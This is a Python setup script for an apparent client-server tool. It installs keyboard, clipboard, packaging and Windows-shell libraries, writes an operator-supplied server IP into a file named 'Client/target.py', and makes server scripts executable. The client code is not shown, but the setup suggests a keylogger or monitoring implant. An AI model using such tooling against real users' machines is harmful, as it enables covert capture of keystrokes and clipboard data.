import subprocess
import sys
import os
import requests
import re

# List of packages to install
packages = [
    "thread",
    "pynput",
    "pyperclip",
    "requests",
    "flask",
    "pyinstaller",
    "winshell",
]


# Define the path to the target file
client_folder = os.path.join(os.path.dirname(__file__), "Client", "target.py")
server_folder = os.path.join(os.path.dirname(__file__), "Server")
scripts = ["start.sh", "check.sh", "stop.sh"]


def make_executables():

    for script in scripts:
        script_path = os.path.join(server_folder, script)
        if os.path.exists(script_path):
            # Apply chmod +x
            os.chmod(script_path, 0o755)
            print(f"Made {script} executable.")
        else:
            print(f"Warning: {script} not found in {server_folder}.")

def install_pacages():
    # Install packages
    for package in packages:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        except subprocess.CalledProcessError:
            print(f"Failed to install {package}")
        else:
            print(f"{package} installed successfully!")

def update_ip_address():
    # Loop until we get a valid IP
    while True:
        ip_address = input("Enter the server IP address (or type 'auto' to detect public IP): ")

        # Handle 'auto' option to get public IP
        if ip_address.lower() == 'auto':
            try:
                ip_address = requests.get('https://api.ipify.org').text
                print(f"Auto-detected public IP: {ip_address}")
            except requests.RequestException:
                print("Could not retrieve public IP. Please enter manually.")
                continue

        # Validate IP format
        if re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", ip_address):
            break
        else:
            print("Invalid IP address format. Please try again.")

    # Read and modify the target.py file
    with open(client_folder, 'r') as file:
        lines = file.readlines()

    # Update the IP line in target.py
    with open(client_folder, 'w') as file:
        for line in lines:
            if line.strip().startswith("server_ip ="):
                file.write(f"server_ip = '{ip_address}'\n")
                print(f"Updated IP address to: {ip_address}")
            else:
                file.write(line)
if __name__ == "__main__":
    update_ip_address()
    install_pacages()
    make_executables()


print("Everything set up!")
print("Press ENTER ot continue...")

input()